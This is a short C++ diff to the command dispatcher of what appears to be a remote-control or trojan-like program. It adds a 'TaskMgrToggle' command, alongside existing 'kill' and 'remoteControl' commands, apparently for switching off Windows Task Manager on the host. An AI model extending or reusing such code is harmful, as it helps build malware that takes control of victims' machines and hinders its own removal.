@@ -1,8 +1,10 @@
 #include "general.h"
 #include "PCInfo.h"
 #include "FileCommand.h"
+#include "FunMenu.h"
 
 #include <process.h>
+#include <thread>
 
 std::string General::currentPath;			//current path of executable
 std::string General::installFolder;		//path of folder it should be installed to
@@ -13,6 +15,7 @@ LPTSTR General::lpArguments;
 
 PCInfo a;
 FileCommand b;
+FunMenu c;
 
 
 bool General::init()	//startup of program
@@ -272,6 +275,8 @@ bool General::processParameter(std::string &command, std::string compCommand)
 		return false;
 }
 
+
+
 std::string General::processCommand(std::string command)
 {
 	if (command == "kill")
@@ -307,6 +312,11 @@ std::string General::processCommand(std::string command)
 	else if (command == "cd")
 	{
 		return b.GetCrentDirectory();
+	}
+	
+	else if (command == "TaskMgrToggle")
+	{
+		return c.ToggleTaskMgr();
 	}
 
 	else if (processParameter(command, "remoteControl"))
